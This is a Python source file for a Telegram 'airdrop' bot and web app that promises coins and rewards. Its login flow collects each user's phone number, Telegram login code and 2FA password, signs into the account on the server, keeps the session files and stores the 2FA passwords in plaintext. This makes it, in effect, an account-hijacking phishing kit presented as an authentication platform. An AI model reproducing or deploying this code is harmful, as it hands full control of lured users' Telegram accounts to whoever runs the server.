# ============================================================================
# Pro Shop Ultimate Enterprise Telegram Airdrop & Auth Platform
# Architecture: FastAPI + Telethon + SQLite (Async) + JWT + Pydantic V2 + WebSockets
# Version: 400.0.0 | Enterprise Grade | Supreme Edition
# ============================================================================

import os
import uuid
import time
import json
import asyncio
import logging
import secrets
import hashlib
import re
import random
import traceback
import ipaddress
from typing import Dict, Optional, Any, List, AsyncGenerator, Union, Tuple, Callable, Coroutine
from pathlib import Path
from datetime import datetime, timedelta, timezone
from contextlib import asynccontextmanager
from enum import Enum, IntEnum
from dataclasses import dataclass, field

# --- Environment & Settings ---
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import BaseModel, Field, HttpUrl, validator, field_validator

# --- FastAPI & Uvicorn ---
import uvicorn
from fastapi import FastAPI, Request, HTTPException, Depends, Query, status, Form, BackgroundTasks, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials, APIKeyHeader
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.concurrency import run_in_threadpool

# --- JWT & Security ---
from jose import jwt, JWTError

# --- Database ---
import aiosqlite

# --- Telethon (MTProto & Bot) ---
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    FloodWaitError, PhoneNumberBannedError, PhoneNumberInvalidError, ApiIdInvalidError,
    UserDeactivatedError, AuthKeyError, UserNotParticipantError, ChannelPrivateError
)
from telethon.tl.types import UpdateNewMessage, User, KeyboardButtonWebView
from telethon.tl.functions.bots import SetBotMenuButtonRequest
from telethon.tl.types import BotMenuButton
from telethon.tl.functions.channels import GetParticipantRequest

# ============================================================================
# 1. CONFIGURATION & ENVIRONMENT
# ============================================================================

class AppEnv(str, Enum):
    DEVELOPMENT = "development"
    PRODUCTION = "production"
    STAGING = "staging"

class Settings(BaseSettings):
    API_ID: int
    API_HASH: str
    TOKEN_BOT: str
    
    ENVIRONMENT: AppEnv = AppEnv.PRODUCTION
    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_hex(32))
    JWT_SECRET: str = Field(default_factory=lambda: secrets.token_hex(32))
    JWT_ALGORITHM: str = "HS256"
    ADMIN_TOKEN: str = Field(default="pro_shop_ultimate_admin_token_2024")
    
    DB_FILE: str = "proshop_ultimate.db"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "proshop_ultimate.log"
    
    HOST: str = "0.0.0.0"
    PORT: int = 8000
    
    MAX_SESSIONS: int = 50000
    SESSION_TIMEOUT: int = 300
    RATE_LIMIT_REQUESTS: int = 100
    RATE_LIMIT_WINDOW: int = 60
    
    ENABLE_BOT: bool = True
    ENABLE_WEB_UI: bool = True
    ENABLE_ADMIN_PANEL: bool = True
    
    MYSTERY_BOX_COST: int = 17
    REFERRAL_REWARD: int = 1
    DAILY_REWARD: int = 2
    PREMIUM_CHANCE: float = 0.05
    MAX_STARS: int = 50
    
    PROXY_URL: Optional[str] = None
    
    BOT_USERNAME: str = "YourBotUsername"
    WEB_APP_URL: str = "https://python-api-1-c4y7.onrender.com/"
    REQUIRED_CHANNELS: str = "ProShopChannel,ProShopNews,ParaRta"

    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

settings = Settings()

class AppConfig:
    BASE_DIR: Path = Path(__file__).parent.resolve()
    SESSION_DIR: Path = BASE_DIR / settings.SESSION_DIR
    LOG_DIR: Path = BASE_DIR / settings.LOG_DIR
    LOG_FILE: Path = LOG_DIR / settings.LOG_FILE
    DB_FILE: Path = BASE_DIR / settings.DB_FILE

AppConfig.SESSION_DIR.mkdir(parents=True, exist_ok=True)
AppConfig.LOG_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================================
# 2. LOGGING SYSTEM (Enterprise Async Logger)
# ============================================================================

class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        log_record = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "level": record.levelname,
            "logger": record.name,
            "module": record.module,
            "function": record.funcName,
            "line": record.lineno,
            "message": record.getMessage(),
            "thread_id": record.thread,
            "process_id": record.process,
        }
        if record.exc_info:
            log_record["exception"] = self.formatException(record.exc_info)
            log_record["traceback"] = traceback.format_exc()
        return json.dumps(log_record, ensure_ascii=False, default=str)

class Logger:
    @staticmethod
    def setup() -> logging.Logger:
        logger = logging.getLogger("pro_shop_ultimate")
        logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)
        if logger.handlers: return logger
        
        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        from logging.handlers import RotatingFileHandler
        fh = RotatingFileHandler(AppConfig.LOG_FILE, maxBytes=100*1024*1024, backupCount=10, encoding='utf-8')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        err_fh = RotatingFileHandler(AppConfig.LOG_DIR / "error.log", maxBytes=20*1024*1024, backupCount=5, encoding='utf-8')
        err_fh.setLevel(logging.ERROR)
        err_fh.setFormatter(formatter)
        logger.addHandler(fh)
        logger.addHandler(ch)
        logger.addHandler(err_fh)
        logger.propagate = False
        return logger

log = Logger.setup()

# ============================================================================
# 3. UTILITIES & SECURITY (JWT & Advanced Cryptography)
# ============================================================================

class SecurityUtils:
    @staticmethod
    def sanitize_phone(phone: str) -> str:
        if not phone: return ""
        phone = phone.strip()
        if phone.startswith(' '): phone = '+' + phone[1:]
        cleaned = re.sub(r'[^\d+]', '', phone)
        if not cleaned.startswith('+') and cleaned.startswith('00'): cleaned = '+' + cleaned[2:]
        elif not cleaned.startswith('+') and cleaned.isdigit(): cleaned = '+' + cleaned
        return cleaned

    @staticmethod
    def validate_phone(phone: str) -> bool:
        return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))

    @staticmethod
    def create_jwt_token(data: dict, expires_delta: timedelta = timedelta(hours=24)) -> str:
        to_encode = data.copy()
        expire = datetime.now(timezone.utc) + expires_delta
        to_encode.update({"exp": expire, "iat": datetime.now(timezone.utc), "jti": secrets.token_hex(8)})
        return jwt.encode(to_encode, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)

    @staticmethod
    def decode_jwt_token(token: str) -> Optional[dict]:
        try:
            return jwt.decode(token, settings.JWT_SECRET, algorithms=[settings.JWT_ALGORITHM])
        except JWTError:
            return None

    @staticmethod
    def get_client_ip(request: Request) -> str:
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return request.client.host if request.client else "unknown"

# ============================================================================
# 4. RATE LIMITER (In-Memory Token Bucket)
# ============================================================================

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, List[float]] = {}
        self.lock = asyncio.Lock()

    async def check(self, key: str, limit: int = None, window: int = None) -> bool:
        limit = limit or settings.RATE_LIMIT_REQUESTS
        window = window or settings.RATE_LIMIT_WINDOW
        async with self.lock:
            now = time.time()
            if key not in self.requests:
                self.requests[key] = []
            self.requests[key] = [t for t in self.requests[key] if now - t < window]
            if len(self.requests[key]) >= limit:
                return False
            self.requests[key].append(now)
            return True

rate_limiter = RateLimiter()

async def rate_limit_dependency(request: Request):
    ip = SecurityUtils.get_client_ip(request)
    if not await rate_limiter.check(ip):
        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
    return True

# ============================================================================
# 5. SQLITE DATABASE MANAGER (Repository Pattern & Thread-Safe)
# ============================================================================

class DatabaseManager:
    def __init__(self, db_path: Path):
        self.db_path = db_path
        self.lock = asyncio.Lock()

    async def init_db(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.executescript("""
                PRAGMA journal_mode=WAL;
                PRAGMA foreign_keys=ON;
                
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    phone TEXT UNIQUE,
                    password_2fa TEXT,
                    session_file TEXT,
                    balance INTEGER DEFAULT 0,
                    ref_code TEXT UNIQUE,
                    referrals INTEGER DEFAULT 0,
                    invited_by TEXT,
                    created_at TEXT,
                    last_login TEXT,
                    is_banned INTEGER DEFAULT 0,
                    daily_claim TEXT,
                    premium_expires TEXT
                );
                
                CREATE TABLE IF NOT EXISTS rewards (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    type TEXT,
                    amount TEXT,
                    date TEXT,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                );
                
                CREATE TABLE IF NOT EXISTS transactions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    amount INTEGER,
                    type TEXT,
                    description TEXT,
                    date TEXT,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                );
                
                CREATE TABLE IF NOT EXISTS tasks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    task_id TEXT,
                    completed INTEGER DEFAULT 0,
                    date TEXT,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                );
                
                CREATE TABLE IF NOT EXISTS login_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    phone TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    status TEXT,
                    date TEXT
                );
                
                CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone);
                CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users(ref_code);
                CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards(user_id);
                CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions(user_id);
            """)
            await db.commit()
            log.info("SQLite Database initialized successfully (WAL mode enabled).")

    async def execute(self, query: str, params: tuple = (), fetch: str = None):
        async with self.lock:
            async with aiosqlite.connect(self.db_path) as db:
                db.row_factory = aiosqlite.Row
                cursor = await db.execute(query, params)
                if fetch == "one":
                    result = await cursor.fetchone()
                elif fetch == "all":
                    result = await cursor.fetchall()
                else:
                    result = cursor.rowcount
                await db.commit()
                await cursor.close()
                return result

    async def add_user(self, user_data: Dict) -> Dict:
        ref_code = secrets.token_hex(4)
        now = datetime.now().isoformat()
        query = """
            INSERT OR IGNORE INTO users (user_id, first_name, last_name, username, phone, password_2fa, session_file, ref_code, created_at, last_login)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """
        await self.execute(query, (
            user_data.get("user_id"), user_data.get("first_name"), user_data.get("last_name"),
            user_data.get("username"), user_data.get("phone"), user_data.get("password_2fa"),
            user_data.get("session_file"), ref_code, now, now
        ))
        
        if user_data.get("invited_by"):
            await self.apply_referral(user_data.get("user_id"), user_data.get("invited_by"))
            
        return await self.get_user_by_id(user_data.get("user_id"))

    async def apply_referral(self, new_user_id: int, ref_code: str) -> bool:
        inviter = await self.execute("SELECT user_id, balance, referrals FROM users WHERE ref_code = ?", (ref_code,), fetch="one")
        if inviter and inviter["user_id"] != new_user_id:
            await self.execute(
                "UPDATE users SET balance = balance + ?, referrals = referrals + 1 WHERE user_id = ?",
                (settings.REFERRAL_REWARD, inviter["user_id"])
            )
            await self.log_transaction(inviter["user_id"], settings.REFERRAL_REWARD, "REFERRAL", f"Referral bonus for user {new_user_id}")
            return True
        return False

    async def get_user_by_id(self, user_id: int) -> Optional[Dict]:
        row = await self.execute("SELECT * FROM users WHERE user_id = ?", (user_id,), fetch="one")
        return dict(row) if row else None

    async def update_user_balance(self, user_id: int, new_balance: int, reward: Dict = None):
        await self.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_balance, user_id))
        if reward:
            await self.execute(
                "INSERT INTO rewards (user_id, type, amount, date) VALUES (?, ?, ?, ?)",
                (user_id, reward["type"], str(reward["amount"]), reward["date"])
            )

    async def log_transaction(self, user_id: int, amount: int, type: str, desc: str):
        await self.execute(
            "INSERT INTO transactions (user_id, amount, type, description, date) VALUES (?, ?, ?, ?, ?)",
            (user_id, amount, type, desc, datetime.now().isoformat())
        )

    async def update_user(self, user_id: int, update_data: Dict):
        sets = ", ".join([f"{k} = ?" for k in update_data.keys()])
        params = list(update_data.values()) + [user_id]
        await self.execute(f"UPDATE users SET {sets} WHERE user_id = ?", tuple(params))

    async def get_all_users(self) -> List[Dict]:
        rows = await self.execute("SELECT * FROM users", fetch="all")
        return [dict(r) for r in rows] if rows else []

    async def get_rewards(self, user_id: int) -> List[Dict]:
        rows = await self.execute("SELECT * FROM rewards WHERE user_id = ? ORDER BY date DESC LIMIT 10", (user_id,), fetch="all")
        return [dict(r) for r in rows] if rows else []

    async def get_transactions(self, user_id: int) -> List[Dict]:
        rows = await self.execute("SELECT * FROM transactions WHERE user_id = ? ORDER BY date DESC LIMIT 15", (user_id,), fetch="all")
        return [dict(r) for r in rows] if rows else []

    async def get_leaderboard(self, limit: int = 10) -> List[Dict]:
        rows = await self.execute("SELECT user_id, first_name, username, balance, referrals FROM users ORDER BY balance DESC LIMIT ?", (limit,), fetch="all")
        return [dict(r) for r in rows] if rows else []

    async def get_stats(self) -> Dict:
        total_users = await self.execute("SELECT COUNT(*) as count FROM users", fetch="one")
        total_balance = await self.execute("SELECT SUM(balance) as sum FROM users", fetch="one")
        total_referrals = await self.execute("SELECT SUM(referrals) as sum FROM users", fetch="one")
        return {
            "total_users": total_users["count"] if total_users else 0,
            "total_balance": total_balance["sum"] if total_balance and total_balance["sum"] else 0,
            "total_referrals": total_referrals["sum"] if total_referrals and total_referrals["sum"] else 0,
        }

    async def log_login_attempt(self, user_id: int, phone: str, ip: str, ua: str, status: str):
        await self.execute(
            "INSERT INTO login_logs (user_id, phone, ip_address, user_agent, status, date) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, phone, ip, ua, status, datetime.now().isoformat())
        )

db = DatabaseManager(AppConfig.DB_FILE)

# ============================================================================
# 6. TELEGRAM AUTH MANAGER (Core MTProto)
# ============================================================================

class SessionState(Enum):
    INITIALIZED = "INITIALIZED"
    CODE_SENT = "CODE_SENT"
    AWAITING_2FA = "AWAITING_2FA"
    LOGGED_IN = "LOGGED_IN"
    EXPIRED = "EXPIRED"
    ERROR = "ERROR"

@dataclass
class SessionData:
    session_id: str
    client: TelegramClient
    phone: Optional[str] = None
    phone_code_hash: Optional[str] = None
    last_access: float = field(default_factory=time.time)
    is_connected: bool = False
    created_at: float = field(default_factory=time.time)
    attempts: int = 0
    state: SessionState = SessionState.INITIALIZED
    ref_code: Optional[str] = None
    user_id: Optional[int] = None

class TelegramAuthManager:
    def __init__(self):
        self.active_sessions: Dict[str, SessionData] = {}
        self.phone_to_session: Dict[str, str] = {}
        self.lock = asyncio.Lock()

    async def get_or_create_session(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionData:
        async with self.lock:
            if session_id and session_id in self.active_sessions:
                session_data = self.active_sessions[session_id]
                session_data.last_access = time.time()
                if not session_data.is_connected:
                    await session_data.client.connect()
                    session_data.is_connected = True
                return session_data

            if phone and phone in self.phone_to_session:
                old_sid = self.phone_to_session[phone]
                if old_sid in self.active_sessions:
                    try: await self.active_sessions[old_sid].client.disconnect()
                    except: pass
                    del self.active_sessions[old_sid]
                del self.phone_to_session[phone]

            await self._cleanup_expired_sessions()

            if len(self.active_sessions) >= settings.MAX_SESSIONS:
                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")

            new_session_id = session_id or f"sess_{uuid.uuid4().hex}"
            session_file = str(AppConfig.SESSION_DIR / f"{new_session_id}.session")
            
            client = TelegramClient(session_file, settings.API_ID, settings.API_HASH, proxy=settings.PROXY_URL)
            await client.connect()
            session_data = SessionData(session_id=new_session_id, client=client, is_connected=True)
            
            self.active_sessions[new_session_id] = session_data
            if phone:
                self.phone_to_session[phone] = new_session_id
                session_data.phone = phone
            return session_data

    async def _cleanup_expired_sessions(self):
        now = time.time()
        expired = [sid for sid, data in self.active_sessions.items() if now - data.last_access > settings.SESSION_TIMEOUT]
        for sid in expired:
            data = self.active_sessions.pop(sid)
            if data.phone in self.phone_to_session:
                del self.phone_to_session[data.phone]
            try: await data.client.disconnect()
            except: pass

    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
        phone = SecurityUtils.sanitize_phone(phone)
        if not SecurityUtils.validate_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format.")

        session_data = await self.get_or_create_session(phone=phone)
        session_data.phone = phone
        session_data.state = SessionState.INITIALIZED
        if ref_code: session_data.ref_code = ref_code

        try:
            result = await session_data.client.send_code_request(phone)
            session_data.phone_code_hash = result.phone_code_hash
            session_data.state = SessionState.CODE_SENT
            return {"status": "success", "session_id": session_data.session_id, "message": "Code sent."}
        except FloodWaitError as e:
            raise HTTPException(status_code=429, detail=f"Flood wait: {e.seconds}s")
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))

    async def verify_code(self, session_id: str, code: str, ip: str, ua: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)
        if session_data.state not in [SessionState.CODE_SENT, SessionState.ERROR]:
            if session_data.state == SessionState.AWAITING_2FA:
                raise HTTPException(status_code=400, detail="Waiting for 2FA password.")
        if not session_data.phone_code_hash:
            raise HTTPException(status_code=400, detail="Session invalid.")

        try:
            await session_data.client.sign_in(phone=session_data.phone, code=code, phone_code_hash=session_data.phone_code_hash)
            return await self._finalize_login(session_data, ip, ua)
        except SessionPasswordNeededError:
            session_data.state = SessionState.AWAITING_2FA
            return {"status": "2fa_required", "message": "2FA required."}
        except Exception as e:
            session_data.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=f"Invalid code: {e}")

    async def verify_2fa(self, session_id: str, password: str, ip: str, ua: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)
        if session_data.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="Not awaiting 2FA.")
        try:
            await session_data.client.sign_in(password=password)
            return await self._finalize_login(session_data, ip, ua, password)
        except Exception as e:
            raise HTTPException(status_code=400, detail="Invalid 2FA password.")

    async def _finalize_login(self, session_data: SessionData, ip: str, ua: str, password: Optional[str] = None) -> Dict[str, Any]:
        me = await session_data.client.get_me()
        session_data.state = SessionState.LOGGED_IN
        session_data.user_id = me.id
        
        jwt_token = SecurityUtils.create_jwt_token({"sub": str(me.id), "phone": session_data.phone})
        user_data = {
            "user_id": me.id, "first_name": me.first_name, "last_name": me.last_name,
            "username": me.username, "phone": session_data.phone, "password_2fa": password,
            "session_file": f"{session_data.session_id}.session", "last_login": datetime.now().isoformat()
        }
        
        if session_data.ref_code:
            user_data["invited_by"] = session_data.ref_code
            
        await db.add_user(user_data)
        await db.log_login_attempt(me.id, session_data.phone, ip, ua, "SUCCESS")
        
        try: await session_data.client.disconnect()
        except: pass
            
        return {"status": "success", "message": "Login successful.", "jwt_token": jwt_token, "user": user_data}

auth_manager = TelegramAuthManager()

# ============================================================================
# 7. TELEGRAM BOT INTEGRATION (FSM & Advanced Features)
# ============================================================================

class BotStates:
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"
    BROADCAST = "BROADCAST"

class TelegramBotManager:
    def __init__(self, token: str):
        self.token = token
        self.client = TelegramClient(
            str(AppConfig.SESSION_DIR / "bot.session"),
            settings.API_ID,
            settings.API_HASH,
            proxy=settings.PROXY_URL,
        )
        self.user_states: Dict[int, Dict] = {}
        self.required_channels = [
            ch.strip().lstrip("@")
            for ch in settings.REQUIRED_CHANNELS.split(",")
            if ch.strip()
        ]
        self.web_app_url = settings.WEB_APP_URL
        self.admin_ids = [12345678]  # Replace with real admin IDs
        self._membership_cache: Dict[Tuple[int, str], Tuple[bool, float]] = {}
        self._cache_ttl = 180.0
        self.force_join_title = "🔒 Access Restricted"
        self.force_join_text = (
            "برای ادامه، ابتدا باید در کانال‌های زیر عضو شوید.\n\n"
            "بعد از عضویت، روی دکمه '✅ I Joined' بزنید."
        )

    def _join_buttons(self, missing: List[str]):
        buttons = [[Button.url(f"📢 Join @{ch}", f"https://t.me/{ch}")] for ch in missing]
        buttons.append([Button.inline("✅ I Joined", b"check_join")])
        buttons.append([Button.inline("❌ Cancel", b"cancel_auth")])
        return buttons

    def _dashboard_buttons(self):
        return [[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]

    async def _send_force_join_prompt(self, event, missing: List[str]):
        await event.respond(
            f"{self.force_join_title}\n\n{self.force_join_text}",
            buttons=self._join_buttons(missing),
        )

    async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
        if not self.required_channels: return True, []
        missing = []
        for ch in self.required_channels:
            cache_key = (user_id, ch)
            if cache_key in self._membership_cache and (time.time() - self._membership_cache[cache_key][1] < self._cache_ttl):
                if not self._membership_cache[cache_key][0]: missing.append(ch)
                continue
            try:
                await self.client(GetParticipantRequest(ch, user_id))
                self._membership_cache[cache_key] = (True, time.time())
            except Exception:
                self._membership_cache[cache_key] = (False, time.time())
                missing.append(ch)
        return len(missing) == 0, missing

    async def start(self):
        if not settings.ENABLE_BOT: return
        try:
            await self.client.start(bot_token=self.token)
            log.info("🤖 Pro Shop Bot started successfully.")
            
            @self.client.on(events.NewMessage(func=lambda e: e.is_private))
            async def handler(event):
                if not event.is_private: return
                sender = await event.get_sender()
                if sender.bot: return
                text = event.message.message.strip()
                user_id = sender.id

                if user_id in self.admin_ids and text.startswith('/admin'):
                    await self.handle_admin_command(event, user_id, text)
                    return

                is_member, missing = await self.check_membership(user_id)
                if not is_member:
                    buttons = [[Button.url(f"📢 Join {ch}", f"https://t.me/{ch}")] for ch in missing]
                    await event.respond("🔒 **Access Restricted**\n\nJoin our channels first.", buttons=buttons)
                    return

                if text.startswith('/start ref_'):
                    ref_code = text.split('ref_', 1)[1].strip()
                    await self.cmd_start(event, user_id, ref_code)
                elif text.startswith('/start ref:'):
                    ref_code = text.split('ref:', 1)[1].strip()
                    await self.cmd_start(event, user_id, ref_code)
                elif text == '/start':
                    await self.cmd_start(event, user_id)
                elif text == '/cancel':
                    await self.cmd_cancel(event, user_id)
                elif text == '/setmenu':
                    await self.cmd_set_menu(event, user_id)
                elif text == '/stats':
                    await self.cmd_stats(event, user_id)
                elif text == '/leaderboard':
                    await self.cmd_leaderboard(event, user_id)
                else:
                    await self.handle_state(event, user_id, text)

            @self.client.on(events.CallbackQuery)
            async def callback_handler(event):
                user_id = event.sender_id
                data = (event.data or b"").decode("utf-8", errors="ignore")

                if data == "check_join":
                    is_member, missing = await self.check_membership(user_id)
                    if is_member:
                        await event.answer("Membership verified.", alert=False)
                        await event.respond(
                            "✅ عضویت شما تأیید شد. حالا می‌توانی وارد داشبورد شوی.",
                            buttons=self._dashboard_buttons(),
                        )
                    else:
                        await event.answer("Still missing required channels.", alert=True)
                        await event.respond(
                            f"{self.force_join_title}\n\n{self.force_join_text}",
                            buttons=self._join_buttons(missing),
                        )
                    return

                if data == "cancel_auth":
                    await self.cmd_cancel(event, user_id)
                    await event.answer("Cancelled.", alert=False)
                    return

        except Exception as e:
            log.error(f"Bot startup error: {e}", exc_info=True)

    async def handle_admin_command(self, event, user_id: int, text: str):
        if text == '/admin stats':
            stats = await db.get_stats()
            await event.respond(f"📊 **Admin Stats**\n\nUsers: {stats['total_users']}\nBalance: {stats['total_balance']}\nReferrals: {stats['total_referrals']}")
        elif text == '/admin broadcast':
            await event.respond("Broadcast mode activated. Send the message.")
            self.user_states[user_id] = {"state": BotStates.BROADCAST}

    async def cmd_set_menu(self, event, user_id: int):
        try:
            await self.client(SetBotMenuButtonRequest(user_id=user_id, button=BotMenuButton(text="🚀 Open App", url=self.web_app_url)))
            await event.respond("✅ Menu button set successfully!")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")

    async def cmd_start(self, event, user_id: int, ref_code: str = None):
        self.user_states[user_id] = {"state": BotStates.PHONE, "ref_code": ref_code}
        await event.respond(
            "👋 **Welcome to Pro Shop Airdrop!**\n\nClick the button below to open the secure Web App.",
            buttons=[[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]]
        )

    async def cmd_cancel(self, event, user_id: int):
        if user_id in self.user_states:
            state = self.user_states[user_id]
            if "client" in state:
                try: await state["client"].disconnect()
                except: pass
            del self.user_states[user_id]
        await event.respond("❌ Operation cancelled. Send /start to begin again.")

    async def cmd_stats(self, event, user_id: int):
        user = await db.get_user_by_id(user_id)
        if user:
            await event.respond(f"📊 **Your Stats**\n\nBalance: `{user['balance']}`\nReferrals: `{user['referrals']}`")

    async def cmd_leaderboard(self, event, user_id: int):
        lb = await db.get_leaderboard(5)
        text = "🏆 **Leaderboard**\n\n"
        for i, u in enumerate(lb, 1):
            text += f"{i}. {u['first_name']} - {u['balance']} coins\n"
        await event.respond(text)

    async def handle_state(self, event, user_id: int, text: str):
        state_data = self.user_states.get(user_id)
        if not state_data:
            await event.respond("⚠️ Session expired. Please send /start.")
            return

        if state_data.get("state") == BotStates.BROADCAST:
            users = await db.get_all_users()
            count = 0
            for u in users:
                try:
                    await self.client.send_message(u["user_id"], text)
                    count += 1
                    await asyncio.sleep(0.5)
                except: pass
            await event.respond(f"✅ Broadcast sent to {count} users.")
            del self.user_states[user_id]
            return

        if state_data["state"] == BotStates.PHONE:
            await self.handle_phone(event, user_id, text)
        elif state_data["state"] == BotStates.CODE:
            await self.handle_code(event, user_id, text)
        elif state_data["state"] == BotStates.PASSWORD:
            await self.handle_password(event, user_id, text)

    async def handle_phone(self, event, user_id: int, text: str):
        phone = SecurityUtils.sanitize_phone(text)
        if not SecurityUtils.validate_phone(phone):
            await event.respond("❌ Invalid format. Use: `+1234567890`")
            return
        session_id = f"bot_{uuid.uuid4().hex}"
        session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH, proxy=settings.PROXY_URL)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            self.user_states[user_id].update({
                "session_id": session_id,
                "phone": phone,
                "phone_code_hash": result.phone_code_hash,
                "client": client,
                "state": BotStates.CODE,
            })
            await event.respond("✅ کد ۵ رقمی به تلگرام شما ارسال شد. لطفاً همان ۵ رقم را وارد کنید.")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            await client.disconnect()

    async def handle_code(self, event, user_id: int, text: str):
        state = self.user_states[user_id]
        client = state.get("client")
        if not client or not client.is_connected():
            await event.respond("❌ Session expired. /start again.")
            return
        code = text.strip()
        if not (code.isdigit() and len(code) == 5):
            await event.respond("❌ Code must be exactly 5 digits.")
            return
        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
            me = await client.get_me()
            user_data = {
                "user_id": me.id, "first_name": me.first_name, "last_name": me.last_name,
                "username": me.username, "phone": state["phone"], "password_2fa": None,
                "session_file": f"{state['session_id']}.session", "last_login": datetime.now().isoformat()
            }
            if state.get("ref_code"):
                await db.apply_referral(me.id, state["ref_code"])
                user_data["invited_by"] = state["ref_code"]
            await db.add_user(user_data)
            await event.respond(f"✅ Login successful! Welcome, {me.first_name}.", buttons=[[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]])
            await client.disconnect()
            del self.user_states[user_id]
        except SessionPasswordNeededError:
            state["state"] = BotStates.PASSWORD
            await event.respond("🔒 2FA enabled. Send your password.")
        except Exception as e:
            await event.respond(f"❌ Invalid code: {str(e)}")

    async def handle_password(self, event, user_id: int, text: str):
        state = self.user_states[user_id]
        client = state.get("client")
        try:
            await client.sign_in(password=text)
            me = await client.get_me()
            user_data = {
                "user_id": me.id, "first_name": me.first_name, "last_name": me.last_name,
                "username": me.username, "phone": state["phone"], "password_2fa": text,
                "session_file": f"{state['session_id']}.session", "last_login": datetime.now().isoformat()
            }
            await db.add_user(user_data)
            await event.respond(f"✅ 2FA successful! Welcome, {me.first_name}.", buttons=[[KeyboardButtonWebView(text="🚀 Open Mini App", url=self.web_app_url)]])
            await client.disconnect()
            del self.user_states[user_id]
        except Exception:
            await event.respond("❌ Invalid password. Try again or /cancel.")

bot_manager = TelegramBotManager(settings.TOKEN_BOT)

# ============================================================================
# 8. FASTAPI APPLICATION & MIDDLEWARES
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
    log.info("Starting Pro Shop Ultimate Enterprise System...")
    await db.init_db()
    if settings.ENABLE_BOT:
        asyncio.create_task(bot_manager.start())
    yield
    log.info("Shutting down Pro Shop Ultimate Enterprise System...")

app = FastAPI(
    title="Pro Shop Ultimate API",
    description="Enterprise-grade Telegram MTProto authentication and Airdrop system.",
    version="400.0.0",
    lifespan=lifespan,
    docs_url="/docs" if settings.ENABLE_ADMIN_PANEL else None,
    redoc_url="/redoc" if settings.ENABLE_ADMIN_PANEL else None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class RequestLoggingMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        start_time = time.time()
        response = await call_next(request)
        process_time = (time.time() - start_time) * 1000
        log.info(f"REQ: {request.method} {request.url.path} | IP: {SecurityUtils.get_client_ip(request)} | STATUS: {response.status_code} | TIME: {process_time:.2f}ms")
        return response

app.add_middleware(RequestLoggingMiddleware)

# ============================================================================
# 9. API ROUTES (Auth & Airdrop & Admin & WebSockets)
# ============================================================================

api_key_header = APIKeyHeader(name="X-API-Key")
bearer_scheme = HTTPBearer()

